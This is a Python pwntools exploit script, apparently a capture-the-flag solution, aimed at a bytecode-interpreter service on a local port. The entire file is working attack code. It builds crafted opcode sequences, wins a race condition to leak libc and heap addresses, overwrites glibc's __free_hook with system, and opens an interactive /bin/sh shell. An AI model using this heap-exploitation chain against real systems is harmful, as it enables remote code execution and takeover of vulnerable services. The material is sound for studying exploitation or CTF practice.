###Race condition

from pwn import *


def create(idx, Type, value):
    command = 1
    if value >= 0x80:
        Type += 1
    if idx >= 0x80:
        command += 1
    return p8(command) + p8(idx) + p8(Type) + p8(value)


def delete(idx):
    command = 2
    if idx >= 0x80:
        command += 1
    return p8(command) + p8(idx)


def edit(idx, value):
    command = 3
    if value >= 0x80:
        idx += 1
    if idx >= 0x80:
        command += 1
    return p8(command) + p8(idx) + p8(value)


def show(idx):
    command = 4
    if idx >= 0x80:
        command += 1
    return p8(command) + p8(idx)


def strops(idx1, idx2, Type):
    opcode = 3 - Type
    if idx2 >= 0x80:
        idx1 += 1
    if idx1 >= 0x80:
        opcode += 1
    return b'\x06' + p8(opcode) + p8(idx1) + p8(idx2)


###Constant
INT = 0
STRING = 1
CHAR = 2

###Addr
#  libc2.29
main_arena_offset = 0x1e4c40
unsorted_bin_offset = main_arena_offset + 0x60
free_hook_offset = 0x1e75a8
system_offset = 0x52fd0

###Exploit
while True:
    r = remote('127.0.0.1', 10111)

    code = create(127, STRING, 0x28) + \
           create(0, STRING, 0xff) + \
           show(127) + \
           edit(0, 0xff) + \
           b''.join([strops(0, 0, STRING) for i in range(4)]) + \
           create(1, STRING, 0x1) + \
           edit(1, 1) + \
           show(1) + \
           b''.join([create(i + 2, STRING, 0x1) for i in range(5)]) + \
           b''.join([delete(i + 2) for i in range(5)]) + \
           delete(1) + \
           edit(127, 1) + \
           create(1, STRING, 0x1) + \
           edit(1, 1) + \
           show(1) + \
           edit(127, 0x28) + \
           create(2, STRING, 0x10) + \
           create(3, STRING, 0x1) + \
           edit(2, 0x10) + \
           b''.join([create(i + 4, INT, 0) + \
                     strops(2, 3, STRING) + \
                     edit(1, 1) + \
                     edit(2, 0x10) + \
                     show(i + 4) + \
                     edit(i + 4, 0x8) + \
                     edit(2, 0x10)
                     for i in range(60)])

    r.sendlineafter('Code :> ', code)
    r.sendlineafter(']\n', 'a' * 0xff)
    r.sendline(b'\xa0')
    unsorted_bin_addr = u64(r.recvline()[12:-2] + b'\x00\x00')
    libc_base = unsorted_bin_addr - unsorted_bin_offset
    print(hex(libc_base))

    r.sendline('\x00')
    r.sendline('a')
    heap_addr = (u64(r.recvline()[12:-2] + b'\x00\x00') - 0x2130) & 0xfffffffffffff000
    print(hex(heap_addr))

    r.sendline(
        b'INT\x00\x00\x00\x00\x00STRING\x00\x00CHAR\x00\x00\x00\x00' + p64(libc_base + free_hook_offset) + p64(0x8))
    r.sendline('a' * 0x10)
    FOUND = False
    for i in range(60):
        r.sendline('\x00')
        r.sendline(p64(heap_addr + 0x2418) + p64(heap_addr + 0x2428))
        try:
            res = r.recvline(timeout=1)
            print(i, res)
            if b'INT' not in res:
                if b'STRING' in res:
                    FOUND = True
                break
        except:
            break
        r.sendline('a' * 0x10)
    if FOUND is False:
        r.close()
        continue
    print('FOUND!')
    sleep(0.5)
    r.sendline(p64(libc_base + system_offset))
    r.sendline('/bin/sh\x00'.ljust(0x10, '\x00'))
    sleep(0.1)

    r.interactive()
    break
